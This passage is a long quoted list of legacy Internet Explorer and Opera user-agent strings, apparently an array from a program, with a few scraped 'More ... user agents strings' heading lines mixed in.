    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
    "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)",
    "Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
    "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)",
    "More Internet Explorer 7.0 user agents strings -->>",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible;  ;  ; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
    "Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)",
    "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
    "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
    "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
    "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
    "Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
    "Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
    "Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
    "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "More Internet Explorer 6.0 user agents strings -->>",
    "Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
    "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
    "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
    "Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
    "Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
    "Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 5.5;)",
    "Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "More Internet Explorer 5.5 user agents strings -->>",
    "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
    " Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
    "Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
    " Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
    " Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
    " Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
    "Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
    "Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
    "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
    "More Internet Explorer 5.01 user agents strings -->>",
    "Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
    "Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
    "More Internet Explorer 5.0 user agents strings -->>",
    "Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
    "Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
    "Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
    " Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
    "Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip830w; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i830; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
    "More Internet Explorer 4.01 user agents strings -->>",
    "Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
    "Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)",
    "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )",
    "Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)",
    "Mozilla/4.0 (Compatible; MSIE 4.0)",
    "Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)",
    "Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
    "Mozilla/2.0 (compatible; MSIE 3.02; Windows 3.1)",
    "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
    " Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
    "Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT)",
    "Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)",
    "Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)",
    "Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)",
    "Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
    "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
    "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
    "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
    "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
    "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
    "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
    "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
    "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
    "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
    "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
    "Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
    "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
    "Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
    "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Vers",
    "Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
    "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
    "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
    "Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
    "Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
    "Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
    "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
    "Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
    "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
    "Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
    "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
    "Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
    "Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
    "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
    "Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
    "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
    "Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
    "Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
    "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
    "Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
    "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
    "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
    "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
    "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
